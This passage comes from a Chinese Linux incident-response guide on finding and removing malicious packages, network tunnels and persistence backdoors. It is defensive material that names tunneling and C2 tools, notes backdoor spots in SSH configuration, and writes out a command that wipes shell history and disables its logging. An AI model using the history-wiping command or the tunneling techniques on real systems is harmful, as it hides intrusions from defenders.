 - `ps -w -aLf pid`      其中SPID就是线程ID，而CMD栏则显示了线程名称
 - `top -H -p pid` -H 选项可以显示线程
 - htop (默认未安装)，可以较为全面的展示线程
 - `pstree -agplU` 推荐，非常全面展示进程与线程间的关系
 - 可以在后面直接加 pid 的值，例如 `pstree -agplU 709` ，查看指定 pid 的进程与线程的关系

 - 查看全部的线程
 - `ps -w -eLFa`

### 0x07 删除恶意软件包

当以下方法无法清除干净的时候，可以考虑将每个文件在不影响系统和业务正常运行的情况下按需删除

【Ubuntu】

 `sudo apt purge <package-name>
或
sudo dpkg -P  <package-name>

```
 其实 apt purge和 dpkg -P 并不会删除个人用户目录(~)下的关于软件包的文件，可以选择手动删除

【Rocky Linux】

通过 yum/dnf 安装的软件包

 `sudo dnf remove <package-name>
或
sudo rpm -e

```
 默认不会清除缓存、日志、依赖等，建议对比之前查出来的相关文件进行对比补充删除

也可以通过 `dnf history` 来将某次安装恢复，以 nmap 为例

 `sudo dnf history
sudo dnf history info id

```

通过 `dnf history` 可以看到软件包历史安装情况，每次操作都有对应 id , 通过 `dns history info id` 可以查看详细情况

 `撤销当时的操作，这里以撤销安装 nmap 为例
sudo dnf history undo id -y

```

### 0x08 善后阶段

直接查看善后阶段即可，尤其是 第三方软件源 GPG 密钥检查

### 0x09 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 确认攻击信息准确性

安全设备、人、上级/行业/监管单位的通报都不见得是准确的，做二次研判是必要的，能够帮我应急响应人员确定整体排查思路

### 询问历史被攻击情况、历史通报

历史攻击可能会留下攻击遗产，成为未来新一轮攻击事件的发起点，询问清楚历史被攻击、被通报情况，向当事人或负责人了解清楚事件性质、处理过程、处理结果，这可能会在完全理不清攻击路径的时候帮你一把

### 采集并确定 ioc 信息

恶意软件包供应链攻击的事件来源可能有很多，例如主动 `rpm -Va` 或 `debsums --all` 检查或被动流量侧、EDR侧检测到恶意程序等，因此这部分以发现恶意软件包程序 pid 为开始

## 12. 隧道

> 原文：https://books.noptrace.com/linux/11.%E9%9A%A7%E9%81%93/

为了隐匿流量，攻击者常常使用隧道来进行流量加密与混淆

隧道事件的事件来源一般有以下几种：

 - 流量设备发现存在网络隧道
 - 主机安全程序发现存在网络隧道或相关文件、进程
 - 排查过程中发现存在跳板机痕迹等，进而发现隧道
 - 运维相关人员发现异常端口等

 其实大家可以发现，处理隧道与处理远控后门没有太大的区别，因为隧道本身就是后门大概念中的一部分，所以也是通过各种特征找到 `PID` ，进而处理

大多数协议隧道都包含两点特征：

 - 存在短时间、单一目标、频繁请求的该协议的数据包
 - 可能出现额外本地到本地的连接 (127.0.0.1:xx -> 127.0.0.1:xx)

 大家需要明白一点，发现隧道并不是应急人员要做的，验证处理才是，现在隧道程序五花八门，尝试去记住特征并识别意义并不大，下面的部分也仅仅是介绍一些隧道技术与正常网络连接的差异，如果隧道程序想做，完全可以做到和正常网络连接没区别

这里给大家推荐一篇总结内网代理工具与检测方法研究的文章，下面部分内容参考该文章

https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483876&idx=1&sn=b71f016be9f345699efcbffdc27b626f&chksm=c2a1d56df5d65c7bbee6e1052d0405eab5cb6dbb98bd549459b83b5a2ab6b530cd078ca5398e&token=229680544&lang=zh_CN#rd

### 0x00 隧道处置方法

隧道处置起来比较困难的是找到隧道对应的进程，尤其是对于 icmp 隧道来说，找到进程后，就可以按照远控后门章节的方式进行处理了

我们在接到隧道事件以后，肯定是知道隧道对端的IP地址了，无论对端IP地址是我们内网还是外网，对我们来说都是最重要的信息，我们要做的就是找到与这个 IP 地址通信的进程，eBPF 赋予了我们这样的能力，以 Ubuntu 为例

对于域名的情况来说，直接通过修改 /etc/hosts 文件的方式或修改内网DNS解析记录的方式将其固定为 IP 地址，所以处理过程是一样的

### 0x01 SSH隧道

SSH隧道的详细实验过程以及分析可以查看知识点附录0x03

隧道跟管子一样，两端都可以作为入口、出口，实验主机分配如下

攻击机就用我的物理机 10.211.55.2

被控主机（做隧道的主机）Centos 10.211.55.11

访问受限主机 Ubuntu 10.211.55.10

### 0x02 DNS隧道

dns隧道是一种相对隐蔽的一种连接方式，通过DNS的A、CNAME、TXT、MX各种记录进行流量传输，检查起来难度较大

常见的DNS隧道工具：

 - dns2tcp
 - dnscat2
 - dnscat2 powershell版
 - iodine
 - Cobalt Strike
 - Reverse_DNS_Shell

 对于DNS隧道，检测主要分为两个方面

 - DNS隧道的进程
 - DNS的流量传输

 进程角度

其实从进程角度很难去查询DNS隧道，水平一般的攻击者也会把默认的工具名称改掉，甚至改成java等和正常应用一样的名，所以这里也只是碰碰运气

 - `ps -w afjx`

 流量角度

对于重要目标的APT一般可以无限延长攻击时间，如果攻击者想，完全可以将数据包发包频率随机化，将DNS查询子域名长度限制在正常长度范围内（比如3～5个字符），在隧道DNS请求间穿插“正常”请求，比如 www.demo.com 的域名解析，甚至抓包模拟正常业务需要解析的域名的各种记录查询，诱导安全人员和设备出错

所以这里我们仅仅讨论隧道正在进行的情况，网络上有很多从AI角度来进行检测DNS隧道的文章，挑选几篇看一看就能了解怎么避免被检测到，可以参考

 - DNS隧道检测特征总结 https://zhuanlan.zhihu.com/p/143220945
 - 探秘-基于机器学习的DNS隐蔽隧道检测方法与实现 https://blog.riskivy.com/探秘-基于机器学习的dns隐蔽隧道检测方法与实现/

 理论结束，进入实操，宗旨就是在Linux服务器上抓一段时间的包，之后拿到桌面计算机上面进行分析

tcpdump

`tcpdump -p -n -s 0 port domain -w dnstest.pcap`

这样我们收集一段时间，之后放入 wireshark 中进行分析

如果DNS流量较大，可以按照域名进行过滤，baidu，sina，ubuntu，centos，redhat 等官方域名都可以筛选掉，剩下的再进行分析

如果其中 A、TXT、CNAME、MX等记录中存在像以下这种比较特殊的请求，可能就存在DNS隧道

### 0x03 ICMP隧道

ICMP 隧道与 DNS隧道类似，都是在正常的请求中加密传输我们自己的载荷

常见ICMP隧道工具

 - ptunnel
 - icmpsh
 - icmptunnel
 - icmpshell

 进程角度

 - `ps -w afjx`

网络连接角度

被攻击主机可能开放新的监听端口，以便后续进行端口转发或者在隧道内创建新的隧道，我们通过以下指令查看

`netstat -pantu`

流量角度

tcpdump 抓取ICMP流量

`tcpdump -p -n -s 0 icmp -w icmp.pcap`

放入 wireshark 进行分析，看看是否存在一些包大小不太正常的流量或者流量中存在其他协议的字符

### 0x04 HTTP/HTTPS 隧道

http 隧道一般以 webshell的形式存在，检测起来基本上就是检测webshell那一套

 - Proxytunnel
 - httptunnel(htc/hts)
 - reGeorg
 - Neo-reGeorg
 - Tunna
 - ABPTTS

 检测手段：

 - 文件查杀

 使用D盾等webshell查杀工具进行查杀

 - D盾
 - 河马查杀
 - ...

 - 文件名

 - 参照小技巧章节中的"查找文件"

 - 文件内容关键字

 - 参照小技巧章节中的"查找文件内容"

 - 流量特征关键字

 - 例如 regeorg 的 cmd 参数等，一般需要安全设备进行辅助

 - 进程

 - proxytunnel 和 httptunnel 这种

 - 新建文件

 - 查找最近或者一段时间内新创建的文件，查找小技巧中查找文件的章节

 - 主机对外行为

 - 建立隧道的目的无非就是攻击内网主机，所以关注本机对外攻击情况可以有一些发现
 - `netstat -pantu`

### 0x05 SSL加密隧道

SSL隧道致力于将其他数据通过SSL加密封装，使内部安全传输

 - stunnel

 - go-tunnel

 ssl隧道软件一般也都是采用客户端/服务端 + 配置文件的形式，所以可以从以下几个角度去分析

 - 进程
 - `ps -w afjx`
 - 文件名 & 新建文件
 - 参照小技巧中关于文件查找的章节
 - 文件内容（配置文件）
 - 参照小技巧中关于文件内容查找的章节

 - 网络通信

 - 至少多一个SSL的端口和网络连接
 - `netstat -pantu`

### 0x06 Socks隧道

- frp

 - earthworm

 - shadowsocks

 socks协议的代理隧道非常多，基本可以通过协议来进行区分，如果安全设备发现存在 socks 协议的通信，那么可以着重观察一下

ssh 的 -D 参数也是使用了socks代理

 - 协议

 - 需要安全设备自动分析，不然tcpdump 抓包后放入wireshark上分析比较麻烦，同时难度也很大

 - 进程

 - `ps -w afjx`

 - 文件名 & 新建文件

 - 参照小技巧中关于文件查找的章节

 - 文件内容（配置文件）

 - 参照小技巧中关于文件内容查找的章节

 - 网络连接

 - `netstat -pantu` 查看是否存在异常的端口连接

 - 行为

 - 是否存在对内网其他主机攻击行为

### 0x07 Wi-Fi or Bluetooth 隧道

- Ghost Tunnel

 参考 Ghost Tunnel：适用于隔离网络的WiFi隐蔽传输通道 - FreeBuf网络安全行业门户

检测方法：

如果不是被专业团队发现，一般安全设备的人员是不会发现这种隐蔽的隧道的，所以这里假设已经有了相关猜测或者证据，我们来发现取证的角度来写

Wi-Fi

 - 将无限网卡设置为监听模式

 - `iwconfig  wlan0 mode monitor`  （wlan0为网卡接口名称）

如果执行失败，可以先把网卡down掉，再进行设置，再up起来

`ifconfig wlan0 down`

`iwconfig wlan0 mode monitor`

`ifconfig wlan0 up`

 - wireshark 抓 802.11的包

 - 对 Wi-Fi 认证过程进行分析，是否存在异常数据包

 正常的认证过程如下：

参考 Ghost Tunnel：适用于隔离网络的WiFi隐蔽传输通道 - FreeBuf网络安全行业门户

Bluetooth

蓝牙的协议一般人了解较少，需要进行抓包后与常规协议进行对比

可以使用 WireShark 进行蓝牙数据包分析，具体可以参考

Bluetooth · Wiki · Wireshark Foundation / wireshark · GitLab

Wi-Fi 和 Bluetooth 的隧道对传输距离有要求，可以简单观察一下四周，不使用的时候关闭蓝牙和Wi-Fi

### 1. 安装 bpftrace

`sudo apt update
sudo apt install bpftrace

```

### 2. 上传监控脚本

`request_monitor.sh`

 `#!/bin/bash

convert_ip_to_integers() {
  local ip=$1
  IFS='.' read -r a b c d <<< "$ip"

  # 计算大端序 (big-endian)
  be_ip_int=$((a << 24 | b << 16 | c << 8 | d))

  # 计算小端序 (little-endian)，需要颠倒字节顺序
  le_ip_int=$((d << 24 | c << 16 | b << 8 | a))

  echo "$be_ip_int $le_ip_int"
}

# IP地址参数
IP="$1"

# 调用函数，获取大端和小端的整数表示
read big_endian little_endian <<< $(convert_ip_to_integers "$IP")

# 假设BPFtrace脚本期望两个参数，分别对应大端和小端

echo "Start listening for the request to $IP"
echo ""
sudo ./request_monitor.bt $big_endian $little_endian

```
 `request_monitor.bt`

 `#!/usr/bin/bpftrace
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/socket.h>

kprobe:__dev_queue_xmit
{
    @dev_queue_xmit[tid]=count();
    @skb[tid]=(struct sk_buff *)arg0;
}

kprobe:__dev_queue_xmit
/@skb[tid]/
{
    $skb = @skb[tid];
    $iph = (struct iphdr *)($skb->head + $skb->network_header);
    $sip = ntop(AF_INET, $iph->saddr);
    $dip = ntop(AF_INET, $iph->daddr);

    if ($iph->daddr == $1 || $iph->daddr == $2){
        printf("[+] Found the request to %s \n", $dip);
        printf("[-] pid=%d, thread_id=%d, comm=%s \n", pid,tid,comm);
    }
}

```

### 3. 设置监听

`sudo ./request_monitor.sh 192.168.31.83

```
 这样就会监测到底是哪个进程在与 192.168.31.83 进行通信

这样就找到了进程的 pid，接下来的处理步骤参考远控后门章节

### 本地转发隧道

检测方法

我们来看一下受控主机是否存在异常

 - 网络连接

从流量上看多了一个攻击机连接受控主机Centos 22端口的连接，同时多了一个受控主机Centos 访问 10.211.55.10 80端口的连接，在我们实验主机中可以清晰看出来，但是如果在实际情况中，很多业务在使用同一个主机的时候，是非常难以分辨出这是一个SSH隧道的，所以从网络连接上辨别SSH隧道难度较大

 - 进程

​   从进程角度来查看多了一个ssh连接进程，这个进程很可能就是有问题的了，可以联系相关主机业务人员确认

 - 日志

 使用lastb 来查看异常登录日志,未发现内容

查看日志文件 `/var/log/secure`

可以看到，存在来自攻击机（物理机 10.211.55.2）的ssh认证连接

对于SSH本地转发隧道来说，执行命令是在攻击机上，所以无法通过history查到任何信息

从上面来看，主要发现SSH隧道的手段就是查看网络连接和日志，这种连接与正常的SSH连接无异，所以较难分辨

### 远程转发隧道

受控机Centos 通过ssh远程连接我们的攻击机(物理机)，并且在我们攻击机上开放一个端口（8008），做socks隧道

反向的好处是在一些防火墙配置下，可能内网主机外联端口会有限制，这样我们通过配置攻击机SSH端口为 53 端口可能成功穿过防火墙

之所以要受控主机远程连接我们物理机，是因为ssh默认配置 -R 参数开放端口绑定的地址是 127.0.0.1 而不是 0.0.0.0 ,这就导致即使我们正向在受控主机 Centos上开了 8008 端口，我们也无法连接，所以我们采用反向的方式

检测方法：

 - 网络连接

网络连接可以看出受控主机SSH远程连接我们的物理机，遇到这种情况就需要进行和主机、业务人员确认连接是否正常业务

 - 进程

进程中可以看到我们执行的命令

 - 日志

​   从history 中可以看到我们的连接操作，关于history的知识点可以查看善后工作中的history

### 动态隧道

上面的两种隧道都是仅仅转发一个IP的一个端口，对于攻击者来说，需要攻击内网的不同应用，如果每攻击一个应用就要映射一次就太麻烦了，所以SSH提供了一种动态隧道，类似代理模式，流量发到入口，由SSH Server来判断具体是否什么协议，转发到那台服务器

动态隧道是一种本地转发隧道,在绑定端口开一个socks4/5的代理，直接设置代理后可以访问内网主机

检测方法

我们来看一下受控主机 Centos 存在哪些异常

 - 网络连接

​   还是一样，能看到网络连接，需要与相关人员确认

 - 进程

​   从进程可以看出多了一个ssh，其他没啥

 - 日志

 异常登录日志中无异常

​   在 /var/log/secure 中可以看到 ssh 认证连接

## 13. 常规安全检查

> 原文：https://books.noptrace.com/linux/12.%E5%B8%B8%E8%A7%84%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5/

善后阶段是所有事件处置都要做的步骤，放在最后一起写，主要内容包括以下几个方面

### 0x01 杀毒工具查杀

- chkrootkit
 - clamav
 - Unhide
 - Rootkit Hunter

### 0x02 history 信息

以下四种情况history 会不完整

 - 被清空或设置不记录， `history -c`  或者 `unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0`
 - 如果ssh 异常中断（比如网络中断），历史命令还在缓冲区中不会写入到文件中，就会导致此连接执行的命令没有记录
 - 如果命令前带一个空格，这条命令就不会被记录
 - 通过 ssh 直接远程执行的命令不会记录
 - 例如 ssh ubuntu@192.168.1.1 "whoami"

 history 信息默认是不显示命令执行的时间的，默认并没有记录，可以通过配置环境变量将时间显示出来，在设置后，在当前 shell 中执行的命令会同时记录时间戳

 `export HISTTIMEFORMAT='%F %T '

```

由于之前没有记录时间，所以此时显示的历史时间是不准的，使用上述命令设置环境变量之后，是一个临时的环境变量，也就是说仅在当前 shell 中记录，断开本次 ssh 或者关闭终端窗口后，会写入到 `~/.bash_history` 中，并且附带时间，可以在后续再次设置环境该环境变量时显示出具体时间

### 0x03 计划任务

需要检查的项

 - /etc/crontab
 - /etc/cron.d/*
 - /var/spool/cron/xxxx
 - /etc/anacrontab (Redhat/Centos)
 - /var/spool/at/*
 - /var/spool/cron/atspool/
 - /var/spool/cron/atjobs/

 建议检查的时候使用vim打开具体的计划任务文件去看，cat命令存在一些缺陷，可以被某些字符截断，造成看的不全，具体可以参考公众号文章 计划任务后门 | Linux 后门系列

【ubuntu server 16.04 64位】 默认计划任务情况

【Ubuntu Server 22.04】默认 at 和 batch 任务

【Centos7 64位】默认计划任务情况

【Rocky Linux 9.1】默认 at 和 batch 任务

更加详细信息可以参照下面这篇文章

https://mp.weixin.qq.com/s/snJ80-Aiy9-XfFvJw380vg

### 0x04 账户信息

- 新增账户

 - cat /etc/passwd

可以与主机和业务相关人员确定是否存在未知账号，即使是 nologin 的也是可能造成风险的，比如使用 sftp 上传下载文件

【ubuntu server 16.04 64位】默认账号情况（helper是我创建的账号）

 `root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-timesync
systemd-network
systemd-resolve
systemd-bus-proxy
syslog
_apt
lxd
messagebus
uuidd
dnsmasq
sshd

```
 【Centos 7】 默认账号情况（helper是我创建的账号）

 `root
bin
daemon
adm
lp
sync
shutdown
halt
mail
operator
games
ftp
nobody
systemd-network
dbus
polkitd
sssd
libstoragemgmt
colord
rpc
abrt
setroubleshoot
rtkit
chrony
ntp
gluster
unbound
tss
usbmuxd
geoclue
pulse
gdm
saned
rpcuser
nfsnobody
gnome-initial-setup
sshd
avahi
postfix
tcpdump

```

### 0x05 特权账户

`awk -F: '$3==0 {print $1}' /etc/passwd`

【ubuntu server 16.04 64位】默认情况

【Centos7 64位】默认情况

### 0x06 登录信息

- w 显示当前登录系统的用户信息
 - who 显示系统中有哪些登录用户
 - last -awF 显示所有登录信息
 - users 当前登录的账户
 - lastlog 显示所有用户最后一次的登录信息
 - lslogins 查看系统账户登录信息

 参考 https://www.jianshu.com/p/05926453654c

### 0x07 特殊权限文件

- SUID
 - `find / -perm /4000`
 - GUID
 - `find / -perm /2000`
 - SUID或者GUID
 - `find / -perm /6000`

 【ubuntu server 16.04 64位】默认情况

【Centos7 64位】默认情况

### 0x08 动态链接库劫持

- LD_PRELOAD

 - `echo $LD_PRELOAD`

 - /etc/ld.so.conf
 - LD_LIBRARY_PATH

 - `echo $LD_LIBRARY_PATH`

 - /etc/ld.so.preload

 【ubuntu server 16.04 64位】默认情况

【Centos7 64位】默认情况

具体可以参考

https://mp.weixin.qq.com/s/7mOeZ6DkSAFqzibN82qcMg

https://mp.weixin.qq.com/s/InMQaKOwns2mEIp5yF8dDw

### 0x09 BASH内置命令

bash

在 bash 中输入一个命令，如果有多个同名指令，bash 需要按照一定规则去取优先级高的一个执行，bash 命令的搜索顺序为：

1、别名，使用alias创建的命令 2、关键字，如if，for 3、函数  4、内置命令，如cd，pwd等  5、外部命令，在PATH路径中寻找

详细可以参考 https://www.cnblogs.com/zhiminyu/p/14388997.html

根据 bash 的命令解析顺序，很多内置命令在系统中也有相关的文件，但是不出意外，这辈子不会得到执行，所以这帮文件就很适合作为后门文件，比较隐蔽

在 Centos 上很多内置命令是有同名文件的，在 /usr/bin/ 目录下边，在 Ubuntu 中没有同名文件。这些文件的内容基本就是执行 bash 内置命令

 - 查看内置命令

 - `compgen -b`   // 不包含使用方法，仅仅列出来命令有哪些

 - `help`        // 列出命令并给出使用方法

 ubuntu 16.04 和 Centos 7 默认内置命令是一样的，如下：

 `.
:
[
alias
bg
bind
break
builtin
caller
cd
command
compgen
complete
compopt
continue
declare
dirs
disown
echo
enable
eval
exec
exit
export
false
fc
fg
getopts
hash
help
history
jobs
kill
let
local
logout
mapfile
popd
printf
pushd
pwd
read
readarray
readonly
return
set
shift
shopt
source
suspend
test
times
trap
true
type
typeset
ulimit
umask
unalias
unset
wait

```

 - 寻找内置命令同名文件

 `compgen -b | grep -v -E "\.|\:" | while read line;do ls /usr/bin/$line 2>null ; done`

ubuntu 16.04 上存在的相关文件

 `/usr/bin/[
/usr/bin/printf
/usr/bin/test

```
 Centos 7 上存在的相关文件

 `/usr/bin/[
/usr/bin/alias
/usr/bin/bg
/usr/bin/cd
/usr/bin/command
/usr/bin/echo
/usr/bin/false
/usr/bin/fc
/usr/bin/fg
/usr/bin/getopts
/usr/bin/jobs
/usr/bin/kill
/usr/bin/printf
/usr/bin/pwd
/usr/bin/read
/usr/bin/test
/usr/bin/true
/usr/bin/umask
/usr/bin/unalias
/usr/bin/wait

```

 - 内置命令对应文件内容

 以 cd 命令为例，Centos 7 中 /usr/bin/cd 内容如下：

这里存在一个问题，有一部分文件(如 /usr/bin/test 等) 不是像上面的脚本文件，而且随着系统版本的不同，bash版本的不同而不同，所以这里先讨论脚本文件，二进制文件以后我再想办法，命令如下：

`compgen -b | grep -v -E "\.|\:" | while read line;do result=$(ls /usr/bin/$line 2>null && file /usr/bin/$line);if [[ $result =~ "script" ]]; then echo "---------------------" && echo /usr/bin/$line && cat /usr/bin/$line; fi ; done`

ubuntu 16.04 内置命令对应文件内容(脚本文件)

ubuntu上没有脚本类同名文件

Centos7 内置命令对应文件内容(脚本文件)

Centos 7 默认是存在以下几个同名的脚本文件

 `/usr/bin/alias
/usr/bin/bg
/usr/bin/cd
/usr/bin/command
/usr/bin/fc
/usr/bin/fg
/usr/bin/getopts
/usr/bin/jobs
/usr/bin/read
/usr/bin/umask
/usr/bin/unalias
/usr/bin/wait

```
 为了方便大家比对，将文件内容粘贴出

 `------------------
/usr/bin/alias
#!/bin/sh
builtin alias "$@"
------------------
/usr/bin/bg
#!/bin/sh
builtin bg "$@"
------------------
/usr/bin/cd
#!/bin/sh
builtin cd "$@"
------------------
/usr/bin/command
#!/bin/sh
builtin command "$@"
------------------
/usr/bin/fc
#!/bin/sh
builtin fc "$@"
------------------
/usr/bin/fg
#!/bin/sh
builtin fg "$@"
------------------
/usr/bin/getopts
#!/bin/sh
builtin getopts "$@"
------------------
/usr/bin/jobs
#!/bin/sh
builtin jobs "$@"
------------------
/usr/bin/read
#!/bin/sh
builtin read "$@"
------------------
/usr/bin/umask
#!/bin/sh
builtin umask "$@"
------------------
/usr/bin/unalias
#!/bin/sh
builtin unalias "$@"
------------------
/usr/bin/wait
#!/bin/sh
builtin wait "$@"

```

### 0x10 BASH 函数

bash

在 bash 中输入一个命令，如果有多个同名指令，bash 需要按照一定规则去取优先级高的一个执行，bash 命令的搜索顺序为：

1、别名，使用alias创建的命令 2、关键字，如if，for 3、函数  4、内置命令，如cd，pwd等  5、外部命令，在PATH路径中寻找

详细可以参考 https://www.cnblogs.com/zhiminyu/p/14388997.html

系统默认就设置了一些函数，可以通过 declare 命令来进行查看 - `declare -f`     查看所有函数的具体定义内容

内容比较长，肉眼比对比较麻烦，工具化参考小技巧篇章第7节

可以使用 `unset -f functionName` 的方式来将恶意的函数删除

### 0x11 环境变量

- `env`
 - `set`
 - `export`
 - `cat /proc/$PID/environ`
 - `declare`

 【ubuntu server 16.04 64位】默认情况

【Centos7 64位】默认情况

### 0x12 启动项&amp;配置脚本

- `systemctl list-unit-files --type=service | grep enabled`
 - 如果发现非法开机自启服务项，可以使用如下语法进行停止并使其不开机自启,以 `bluetooth` 为例
 - `systemctl stop bluetooth.service`
 - `systemctl disable bluetooth.service`
 - /etc/rc.local
 - /etc/rc.d/rc.local
 - /etc/rc.d/init.d/
 - chkconfig --list
 - /etc/profile
 - /etc/profile.d/*
 - /etc/bashrc
 - ~/.bashrc
 - ~/.bash_profile
 - ~/.profile
 - ~/.bash_logout

 由于内容较多，所以放在了知识点附录，具体 Ubutnu和Centos中默认启动项可以查看知识点附录 0x02

### 0x13 ssh key

- `/root/.ssh/authorized_keys`  保存着远程主机的公钥，远程主机可以无密码登录
 - `~/.ssh/authorized_keys` 每个用户都会在自己的家目录保存一份
 - `/root/.ssh/known_hosts` 每登录一台主机ssh就会把对方的公钥记录下来，下次连接进行比对，以防止网络劫持

 `~/.ssh/authorized_keys`  和 `~/.ssh/authorized_keys2` 文件可以被用来配置后门，检查方法如下

相关后门文章可以查看

https://mp.weixin.qq.com/s/R_CUPqa2WQUgOJu__5MFzg

本质上来说，可以通过密钥直接访问该ssh服务器的主机公钥的存储位置是由配置文件决定的，具体配置在 `/etc/ssh/sshd_config` 的 `AuthorizedKeysFile` 参数

默认情况下以下两个文件内容都有效

 - `~/.ssh/authorized_keys`
 - `~/.ssh/authorized_keys2`

 此部分检查主要分为两个方向

 - 是否存在非法添加的公钥
 - 存储的公钥行中是否存在 command 参数
 - 一般在行开头 `command="xxxx"`
 - command 指定的命令会在对应用户登录时执行

### 0x14 ssh config

ssh 客户端配置文件加载顺序 命令行参数 > ~/.ssh/config > /etc/ssh/ssh_config

`/etc/ssh/ssh_config`

这个文件默认存在

`~/.ssh/config`

默认是没有这个文件的，这个文件是给客户端用的

如果上述两个文件存在，可以检查其中的参数，以下两个参数可以被用作后门

 - LocalCommand

 - ProxyCommand

 具体可以参照公众号文章 SSH Config 后门 ｜ Linux 后门系列

### 0x15 alias 信息

- 直接输入 `alias` 就好

 【Ubuntu server 16.04 64位】 默认情况

【Centos 7 64位】默认情况

具体可以参考

https://mp.weixin.qq.com/s/yXY8opNctHK5d9tXhQj35w

### 0x16 DNS配置

- `/etc/resolv.conf`

### 0x17 日志

日志分析就比较笼统了，基本上上面都涉及到了，基本都在 /var/log/ 下

 - ssh-key 追踪

Linux通过key登录。有没有什么好办法判断是哪个key登录的?

可以通过登录日志来进行判断，以下面的日志为例

这是两个使用 key 来登录的主机的登录日志，首先是可以看到登录ip的，但是如果想知道分别是哪个key来进行登录的，那就需要把

`ssh2: RSA SHA256:Ms6ouzQCIZhNUJWpMmOCBB4h7+x92xu4apHTLe8nVwQ`

`ssh2: RSA SHA256:C5dMZnKUj8/0c5hj6CSU6D7N8EQK/qbl5CnkLC17GLc` 这两个值与我们服务器存储的客户端的公钥进行一一对比

其实这两个值是客户端 RSA 公钥的 SHA256 的值，所以我们可以使用下面的命令把服务器上存储的所有的公钥的SHA 256 计算出来，对比一下

`ssh-keygen -lf ~/.ssh/authorized_keys`

这样一对比就知道是谁了

 - journalctl 查看服务日志

 `journalctl -u 服务名称

```

可以通过以下两条命令获取到相应的服务名称

 `systemctl list-units --type=service
service --status-all

```

### 0x18 ptrace_scope

默认系统会禁止ptrace进行一些操作，比如 fork 等，可以查看 /proc/sys/kernel/yama/ptrace_scope 文件内容

【ubuntu Server 16.04 】默认

【centos 7】 默认

### 0x19 ASLR

ASLR 是一项 Linux 系统的保护措施，将某些地址空间进行随机化，减缓一些溢出攻击

`cat /proc/sys/kernel/randomize_va_space`

此处文件内容含义如下：

 - 0 - 表示关闭进程地址空间随机化。
 - 1 - 表示将mmap的基址，stack和vdso页面随机化
 - 2 - 表示在1的基础上增加堆（heap）的随机化

 【Ubuntu Server 16.04】默认情况

【Centos 7】默认情况

`/proc/sys/kernel/randomize_va_space` 是一个在系统运行时生成的文件；一般都在 `/etc/sysctl.conf` 中配置 ASLR 的永久关闭

【Ubuntu Server 16.04】默认情况

【Centos 7】默认情况

### 0x20 capabilities

capabilities 是一种对 Linux 权限更严格划分和管控的规范，设置得当可以有效防止过度授权造成提权操作

`getcap -r / 2>/dev/null`

【Ubuntu Server 16.04】默认情况

【Centos 7】默认情况

如果发现权限设置错误，可以使用 `setcap` 进行重新设置或者取消

### 0x21 iptables 端口复用

有些攻击者喜欢使用 iptables 进行端口复用

`sudo iptables -L`

【Ubuntu Server 16.04】默认情况

【Centos 7】默认情况

 `Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
ACCEPT     all  --  anywhere             anywhere
INPUT_direct  all  --  anywhere             anywhere
INPUT_ZONES_SOURCE  all  --  anywhere             anywhere
INPUT_ZONES  all  --  anywhere             anywhere
DROP       all  --  anywhere             anywhere             ctstate INVALID
REJECT     all  --  anywhere             anywhere             reject-with icmp-host-prohibited

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
ACCEPT     all  --  anywhere             anywhere
FORWARD_direct  all  --  anywhere             anywhere
FORWARD_IN_ZONES_SOURCE  all  --  anywhere             anywhere
FORWARD_IN_ZONES  all  --  anywhere             anywhere
FORWARD_OUT_ZONES_SOURCE  all  --  anywhere             anywhere
FORWARD_OUT_ZONES  all  --  anywhere             anywhere
DROP       all  --  anywhere             anywhere             ctstate INVALID
REJECT     all  --  anywhere             anywhere             reject-with icmp-host-prohibited

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere
OUTPUT_direct  all  --  anywhere             anywhere

Chain FORWARD_IN_ZONES (1 references)
target     prot opt source               destination
FWDI_public  all  --  anywhere             anywhere            [goto]
FWDI_public  all  --  anywhere             anywhere            [goto]

Chain FORWARD_IN_ZONES_SOURCE (1 references)
target     prot opt source               destination

Chain FORWARD_OUT_ZONES (1 references)
target     prot opt source               destination
FWDO_public  all  --  anywhere             anywhere            [goto]
FWDO_public  all  --  anywhere             anywhere            [goto]

Chain FORWARD_OUT_ZONES_SOURCE (1 references)
target     prot opt source               destination

Chain FORWARD_direct (1 references)
target     prot opt source               destination

Chain FWDI_public (2 references)
target     prot opt source               destination
FWDI_public_log  all  --  anywhere             anywhere
FWDI_public_deny  all  --  anywhere             anywhere
FWDI_public_allow  all  --  anywhere             anywhere
ACCEPT     icmp --  anywhere             anywhere

Chain FWDI_public_allow (1 references)
target     prot opt source               destination

Chain FWDI_public_deny (1 references)
target     prot opt source               destination

Chain FWDI_public_log (1 references)
target     prot opt source               destination

Chain FWDO_public (2 references)
target     prot opt source               destination
FWDO_public_log  all  --  anywhere             anywhere
FWDO_public_deny  all  --  anywhere             anywhere
FWDO_public_allow  all  --  anywhere             anywhere

Chain FWDO_public_allow (1 references)
target     prot opt source               destination

Chain FWDO_public_deny (1 references)
target     prot opt source               destination

Chain FWDO_public_log (1 references)
target     prot opt source               destination

Chain INPUT_ZONES (1 references)
target     prot opt source               destination
IN_public  all  --  anywhere             anywhere            [goto]
IN_public  all  --  anywhere             anywhere            [goto]

Chain INPUT_ZONES_SOURCE (1 references)
target     prot opt source               destination

Chain INPUT_direct (1 references)
target     prot opt source               destination

Chain IN_public (2 references)
target     prot opt source               destination
IN_public_log  all  --  anywhere             anywhere
IN_public_deny  all  --  anywhere             anywhere
IN_public_allow  all  --  anywhere             anywhere
ACCEPT     icmp --  anywhere             anywhere

Chain IN_public_allow (1 references)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh ctstate NEW,UNTRACKED
ACCEPT     udp  --  anywhere             224.0.0.251          udp dpt:mdns ctstate NEW,UNTRACKED

Chain IN_public_deny (1 references)
target     prot opt source               destination

Chain IN_public_log (1 references)
target     prot opt source               destination

Chain OUTPUT_direct (1 references)
